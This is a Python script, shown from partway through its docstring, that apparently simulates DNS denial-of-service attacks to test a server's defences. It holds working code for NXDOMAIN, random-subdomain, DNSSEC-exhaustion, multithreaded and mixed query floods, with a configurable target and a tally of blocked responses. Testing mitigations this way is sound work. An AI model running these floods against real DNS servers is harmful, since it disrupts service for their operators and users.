─────────────────────────────────────────────────────────
Attacks:
  1. Amplification          (QTYPE ANY flood)
  2. NXDOMAIN Flood
  3. Random Subdomain/PRSD
  4. DNS Flood
  5. Phantom Domain
  6. Bot-Based
  7. DNSSEC Validation Exhaustion  (DNSKEY/RRSIG flood)
  8. Multi-Vector LDDoS            (mixed attack with custom ratios)

Usage:
    python attack_sim.py                        # interactive menu
    python attack_sim.py --target 127.0.0.1 --port 1053
    python attack_sim.py --attack 7             # run single attack
    python attack_sim.py --attack 1,3,7         # run multiple
    python attack_sim.py --attack all
"""

import socket
import time
import random
import string
import argparse
import threading
from collections import defaultdict

from dnslib import DNSRecord, QTYPE


# ═════════════════════════════════════════════════════════════════════════════
# Output helpers
# ═════════════════════════════════════════════════════════════════════════════
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def _ok(msg):   print(f"  {GREEN}[BLOCKED]{RESET}  {msg}")
def _info(msg): print(f"  {CYAN}[INFO]{RESET}     {msg}")
def _warn(msg): print(f"  {YELLOW}[WARN]{RESET}     {msg}")
def _err(msg):  print(f"  {RED}[ERROR]{RESET}    {msg}")

def _header(title):
    print(f"\n{BOLD}{'═'*60}{RESET}")
    print(f"{BOLD}  {title}{RESET}")
    print(f"{BOLD}{'═'*60}{RESET}")

def _bar(label):
    print(f"\n{BOLD}{'─'*60}{RESET}")
    print(f"{BOLD}  {label}{RESET}")
    print(f"{BOLD}{'─'*60}{RESET}")

def _summary(label, total, blocked):
    pct   = blocked * 100 // total if total else 0
    color = GREEN if pct > 60 else (YELLOW if pct > 20 else RED)
    print(f"\n  Result -> sent={total}  "
          f"blocked={color}{blocked}{RESET}  ({pct}% blocked)")


# ═════════════════════════════════════════════════════════════════════════════
# Core query sender
# ═════════════════════════════════════════════════════════════════════════════
def send_query(host, port, qname, qtype="A", timeout=2.0):
    try:
        q    = DNSRecord.question(qname, qtype)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(q.pack(), (host, port))
        data, _ = sock.recvfrom(4096)
        sock.close()
        from dnslib import RCODE
        return RCODE[DNSRecord.parse(data).header.rcode]
    except socket.timeout:
        return "TIMEOUT"
    except Exception as e:
        return f"ERROR({e})"


# ═════════════════════════════════════════════════════════════════════════════
# Default parameters for each attack (can be overridden interactively)
# ═════════════════════════════════════════════════════════════════════════════
DEFAULTS = {
    1: {"count": 60,  "delay": 0.02,  "threads": 1,  "qtype": "ANY"},
    2: {"count": 80,  "delay": 0.03,  "threads": 1},
    3: {"count": 60,  "delay": 0.02,  "threads": 1,  "base_domain": "example.com"},
    4: {"count": 300, "delay": 0.0,   "threads": 10},
    5: {"count": 50,  "delay": 0.05,  "threads": 1},
    6: {"count": 80,  "delay": 0.10,  "threads": 1},
    7: {"count": 100, "delay": 0.01,  "threads": 1,  "qtype": "DNSKEY"},
    8: {"count": 200, "delay": 0.02,  "threads": 4,
        "ratios": {3: 40, 2: 30, 7: 20, 6: 10}},  # attack_id -> percent
}

ATTACK_NAMES = {
    1: "Amplification",
    2: "NXDOMAIN Flood",
    3: "Random Subdomain / PRSD",
    4: "DNS Flood",
    5: "Phantom Domain",
    6: "Bot-Based",
    7: "DNSSEC Validation Exhaustion",
    8: "Multi-Vector LDDoS",
}


# ═════════════════════════════════════════════════════════════════════════════
# Individual attack functions
# ═════════════════════════════════════════════════════════════════════════════

# ── 1. Amplification ─────────────────────────────────────────────────────────
def sim_amplification(host, port, params):
    count = params["count"]
    delay = params["delay"]
    qtype = params.get("qtype", "ANY")
    _bar(f"ATTACK 1 — Amplification  (QTYPE {qtype} flood)")
    _info(f"target={host}:{port}  count={count}  delay={delay}s  qtype={qtype}")
    blocked = 0
    for i in range(count):
        r = send_query(host, port, "example.com", qtype)
        if r in ("REFUSED", "TIMEOUT"): blocked += 1
        if i % 10 == 0:
            print(f"  [{i:>4}/{count}]  last={r}")
        if delay: time.sleep(delay)
    _summary("Amplification", count, blocked)


# ── 2. NXDOMAIN Flood ────────────────────────────────────────────────────────
def sim_nxdomain_flood(host, port, params):
    count = params["count"]
    delay = params["delay"]
    _bar("ATTACK 2 — NXDOMAIN Flood")
    _info(f"target={host}:{port}  count={count}  delay={delay}s")
    for i in range(count):
        domain = f"nx-{''.join(random.choices(string.ascii_lowercase, k=8))}.fake.com"
        r = send_query(host, port, domain)
        if i % 10 == 0:
            print(f"  [{i:>4}/{count}]  {domain:<42}  -> {r}")
        if delay: time.sleep(delay)
    print("\n  Done.")


# ── 3. Random Subdomain / PRSD ───────────────────────────────────────────────
def sim_random_subdomain(host, port, params):
    count  = params["count"]
    delay  = params["delay"]
    base   = params.get("base_domain", "example.com")
    _bar(f"ATTACK 3 — Random Subdomain / PRSD  (base: {base})")
    _info(f"target={host}:{port}  count={count}  delay={delay}s")
    for i in range(count):
        prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        r = send_query(host, port, f"{prefix}.{base}")
        if i % 10 == 0:
            print(f"  [{i:>4}/{count}]  {prefix}.{base}  -> {r}")
        if delay: time.sleep(delay)
    print("\n  Done.")


# ── 4. DNS Flood ─────────────────────────────────────────────────────────────
def sim_flood(host, port, params):
    total   = params["count"]
    threads = params.get("threads", 10)
    _bar(f"ATTACK 4 — DNS Flood  ({total} queries / {threads} threads)")
    _info(f"target={host}:{port}")
    counter = {"sent": 0, "blocked": 0}
    lock    = threading.Lock()

    def worker():
        for _ in range(total // threads):
            r = send_query(host, port, "example.com", timeout=1.0)
            with lock:
                counter["sent"] += 1
                if r in ("REFUSED", "TIMEOUT"): counter["blocked"] += 1

    ts = [threading.Thread(target=worker) for _ in range(threads)]
    [t.start() for t in ts]
    [t.join()  for t in ts]
    _summary("DNS Flood", counter["sent"], counter["blocked"])


# ── 5. Phantom Domain ────────────────────────────────────────────────────────
def sim_phantom_domain(host, port, params):
    count = params["count"]
    delay = params["delay"]
    tlds  = [".invalid", ".test", ".example", ".localhost", ".internal"]
    _bar("ATTACK 5 — Phantom Domain  (invalid TLDs)")
    _info(f"target={host}:{port}  count={count}  delay={delay}s")
    for i in range(count):
        domain = f"server{i}{random.choice(tlds)}"
        r = send_query(host, port, domain)
        if i % 10 == 0:
            print(f"  [{i:>4}/{count}]  {domain:<40}  -> {r}")
        if delay: time.sleep(delay)
    print("\n  Done.")


# ── 6. Bot-Based ─────────────────────────────────────────────────────────────
def sim_bot_based(host, port, params):
    count = params["count"]
    delay = params.get("delay", 0.10)
    _bar("ATTACK 6 — Bot-Based  (identical queries at fixed interval)")
    _info(f"target={host}:{port}  count={count}  interval={delay}s  (uniform = bot signature)")
    blocked = 0
    for i in range(count):
        r = send_query(host, port, "example.com")
        if r in ("REFUSED", "TIMEOUT"): blocked += 1
        if i % 10 == 0:
            print(f"  [{i:>4}/{count}]  example.com  -> {r}")
        time.sleep(delay)   # perfectly uniform timing
    _summary("Bot-Based", count, blocked)


# ── 7. DNSSEC Validation Exhaustion ──────────────────────────────────────────
def sim_dnssec_exhaustion(host, port, params):
    count    = params["count"]
    delay    = params["delay"]
    qtype    = params.get("qtype", "DNSKEY")   # DNSKEY or RRSIG
    threads  = params.get("threads", 1)

    _bar(f"ATTACK 7 — DNSSEC Validation Exhaustion  (QTYPE {qtype})")
    _info(f"target={host}:{port}  count={count}  delay={delay}s  threads={threads}")
    _info("Goal: flood DNSKEY/RRSIG queries to exhaust server-side crypto CPU")

    counter = {"sent": 0, "blocked": 0}
    lock    = threading.Lock()

    def worker(n):
        for _ in range(n):
            # Alternate between DNSKEY and RRSIG for maximum CPU pressure
            qt = random.choice(["DNSKEY", "RRSIG"]) if qtype == "BOTH" else qtype
            r  = send_query(host, port, "example.com", qt)
            with lock:
                counter["sent"] += 1
                if r in ("REFUSED", "TIMEOUT"): counter["blocked"] += 1
            if delay: time.sleep(delay)

    per = count // threads
    ts  = [threading.Thread(target=worker, args=(per,)) for _ in range(threads)]
    for t in ts: t.start()

    # live progress
    while any(t.is_alive() for t in ts):
        with lock:
            sent    = counter["sent"]
            blocked = counter["blocked"]
        print(f"  Progress: sent={sent}  blocked={blocked}", end="\r")
        time.sleep(0.5)
    for t in ts: t.join()
    print()

    _summary("DNSSEC Exhaustion", counter["sent"], counter["blocked"])


# ── 8. Multi-Vector LDDoS ────────────────────────────────────────────────────
def sim_multivector(host, port, params):
    total   = params["count"]
    delay   = params["delay"]
    threads = params.get("threads", 4)
    ratios  = params["ratios"]   # {attack_id: percent}

    _bar("ATTACK 8 — Multi-Vector LDDoS")
    _info(f"target={host}:{port}  total={total}  threads={threads}  delay={delay}s")

    # Normalize ratios
    total_pct = sum(ratios.values())
    normalized = {k: v / total_pct for k, v in ratios.items()}

    print(f"\n  Attack mix:")
    for aid, pct in ratios.items():
        bar_len = int(pct / 2)
        print(f"    [{aid}] {ATTACK_NAMES[aid]:<30} "
              f"{CYAN}{'█' * bar_len}{RESET} {pct}%")

    # Build a weighted list of query generators
    def gen_amplification():
        return send_query(host, port, "example.com", "ANY")

    def gen_nxdomain():
        domain = f"nx-{''.join(random.choices(string.ascii_lowercase, k=8))}.fake.com"
        return send_query(host, port, domain)

    def gen_random_subdomain():
        prefix = ''.join(random.choices(string.ascii_lowercase, k=10))
        return send_query(host, port, f"{prefix}.example.com")

    def gen_flood():
        return send_query(host, port, "example.com")

    def gen_phantom():
        tlds = [".invalid", ".test", ".internal"]
        return send_query(host, port, f"server{random.randint(0,999)}{random.choice(tlds)}")

    def gen_bot():
        return send_query(host, port, "example.com")

    def gen_dnssec():
        qt = random.choice(["DNSKEY", "RRSIG"])
        return send_query(host, port, "example.com", qt)

    gen_map = {
        1: gen_amplification,
        2: gen_nxdomain,
        3: gen_random_subdomain,
        4: gen_flood,
        5: gen_phantom,
        6: gen_bot,
        7: gen_dnssec,
    }

    # Build weighted pool
    pool = []
    for aid, weight in normalized.items():
        count_for_attack = max(1, int(total * weight))
        pool.extend([gen_map[aid]] * count_for_attack)
    random.shuffle(pool)

    counter = {"sent": 0, "blocked": 0}
    lock    = threading.Lock()

    def worker(chunk):
        for gen_fn in chunk:
            r = gen_fn()
            with lock:
                counter["sent"] += 1
                if r in ("REFUSED", "TIMEOUT"): counter["blocked"] += 1
            if delay: time.sleep(delay)

    # Split pool across threads
    chunk_size = max(1, len(pool) // threads)
    chunks     = [pool[i:i+chunk_size] for i in range(0, len(pool), chunk_size)]

    ts = [threading.Thread(target=worker, args=(chunk,)) for chunk in chunks]
    print()
    for t in ts: t.start()

    while any(t.is_alive() for t in ts):
        with lock:
            sent    = counter["sent"]
            blocked = counter["blocked"]
        pct = blocked * 100 // sent if sent else 0
        print(f"  Progress: sent={sent}  blocked={blocked}  ({pct}%)", end="\r")
        time.sleep(0.5)
    for t in ts: t.join()
    print()

    _summary("Multi-Vector LDDoS", counter["sent"], counter["blocked"])


# ═════════════════════════════════════════════════════════════════════════════
# Parameter prompts
# ═════════════════════════════════════════════════════════════════════════════
def _ask(prompt, default, cast=str):
    try:
        raw = input(f"  {prompt} [{default}]: ").strip()
        return cast(raw) if raw else default
    except (EOFError, KeyboardInterrupt):
        return default


def prompt_params(attack_id: int) -> dict:
    """Ask user to confirm or override default parameters for an attack."""
    defaults = DEFAULTS[attack_id].copy()
    print(f"\n  {CYAN}Parameters for {ATTACK_NAMES[attack_id]}:{RESET}")

    if attack_id in (1, 7):
        defaults["count"] = _ask("Query count",  defaults["count"],  int)
        defaults["delay"] = _ask("Delay (secs)", defaults["delay"],  float)
        defaults["threads"] = _ask("Threads",    defaults.get("threads", 1), int)
        if attack_id == 7:
            qt = _ask("Query type (DNSKEY/RRSIG/BOTH)", defaults.get("qtype","DNSKEY"), str)
            defaults["qtype"] = qt.upper()
        else:
            qt = _ask("Query type (ANY/TXT/DNSKEY)", defaults.get("qtype","ANY"), str)
            defaults["qtype"] = qt.upper()

    elif attack_id == 3:
        defaults["count"]       = _ask("Query count",    defaults["count"],  int)
        defaults["delay"]       = _ask("Delay (secs)",   defaults["delay"],  float)
        defaults["base_domain"] = _ask("Base domain",    defaults["base_domain"], str)

    elif attack_id == 4:
        defaults["count"]   = _ask("Total queries", defaults["count"],   int)
        defaults["threads"] = _ask("Threads",        defaults["threads"], int)

    elif attack_id == 6:
        defaults["count"] = _ask("Query count",         defaults["count"], int)
        defaults["delay"] = _ask("Interval (secs)",     defaults["delay"], float)

    elif attack_id == 8:
        defaults["count"]   = _ask("Total queries",  defaults["count"],   int)
        defaults["delay"]   = _ask("Delay (secs)",   defaults["delay"],   float)
        defaults["threads"] = _ask("Threads",         defaults["threads"], int)

        print(f"\n  {CYAN}Attack mix ratios (must add up, auto-normalized):{RESET}")
        print(f"  Available attacks: " +
              ", ".join(f"{k}={ATTACK_NAMES[k]}" for k in range(1, 8)))
        raw = _ask("Attack IDs (e.g. 3,2,7,6)",    "3,2,7,6", str)
        ids  = [int(x.strip()) for x in raw.split(",") if x.strip().isdigit()]

        ratios = {}
        for aid in ids:
            pct = _ask(f"  % for [{aid}] {ATTACK_NAMES[aid]}", 25, int)
            ratios[aid] = pct
        defaults["ratios"] = ratios

    else:
        defaults["count"] = _ask("Query count",  defaults["count"], int)
        defaults["delay"] = _ask("Delay (secs)", defaults["delay"], float)

    return defaults


# ═════════════════════════════════════════════════════════════════════════════
# Dispatcher
# ═════════════════════════════════════════════════════════════════════════════
RUNNERS = {
    1: sim_amplification,
    2: sim_nxdomain_flood,
    3: sim_random_subdomain,
    4: sim_flood,
    5: sim_phantom_domain,
    6: sim_bot_based,
    7: sim_dnssec_exhaustion,
    8: sim_multivector,
}

def run_attack(attack_id, host, port, interactive=True):
    if interactive:
        params = prompt_params(attack_id)
    else:
        params = DEFAULTS[attack_id].copy()
    RUNNERS[attack_id](host, port, params)


def run_all(host, port, interactive=True):
    for aid in range(1, 9):
        run_attack(aid, host, port, interactive)
        print(f"\n  {YELLOW}Pausing 3s ...{RESET}")
        time.sleep(3)


# ═════════════════════════════════════════════════════════════════════════════
# Interactive menu
# ═════════════════════════════════════════════════════════════════════════════
def interactive_menu(host, port):
    _header("DNS Attack Simulator — Interactive Mode")
    print(f"  Target: {CYAN}{host}:{port}{RESET}\n")

    for aid, name in ATTACK_NAMES.items():
        print(f"  [{aid}] {name}")
    print(f"  [0] Run ALL attacks")
    print()

    raw = input("  Select attack(s) — single (3), list (1,3,7), or 0 for all: ").strip()

    if raw == "0":
        run_all(host, port, interactive=True)
        return

    ids = []
    for part in raw.split(","):
        part = part.strip()
        if part.isdigit() and 1 <= int(part) <= 8:
            ids.append(int(part))

    if not ids:
        _err("No valid attack IDs entered.")
        return

    for aid in ids:
        run_attack(aid, host, port, interactive=True)
        if len(ids) > 1:
            print(f"\n  {YELLOW}Pausing 2s ...{RESET}")
            time.sleep(2)


# ═════════════════════════════════════════════════════════════════════════════
# CLI
# ═════════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DNS Attack Simulator")
    parser.add_argument("--target", default="127.0.0.1",
                        help="DNS server IP (default: 127.0.0.1)")
    parser.add_argument("--port",   type=int, default=1053,
                        help="DNS server port (default: 1053)")
    parser.add_argument("--attack", default=None,
                        help="Attack(s) to run: single (3), list (1,3,7), or 'all'. "
                             "Omit for interactive menu.")
    parser.add_argument("--no-prompt", action="store_true",
                        help="Skip parameter prompts, use defaults")
    args = parser.parse_args()

    interactive = not args.no_prompt

    if args.attack is None:
        interactive_menu(args.target, args.port)

    elif args.attack.lower() == "all":
        run_all(args.target, args.port, interactive)

    else:
        ids = []
        for part in args.attack.split(","):
            part = part.strip()
            if part.isdigit() and 1 <= int(part) <= 8:
                ids.append(int(part))
        if not ids:
            _err(f"Invalid --attack value: {args.attack}")
        for aid in ids:
            run_attack(aid, args.target, args.port, interactive)
            if len(ids) > 1:
                time.sleep(2)

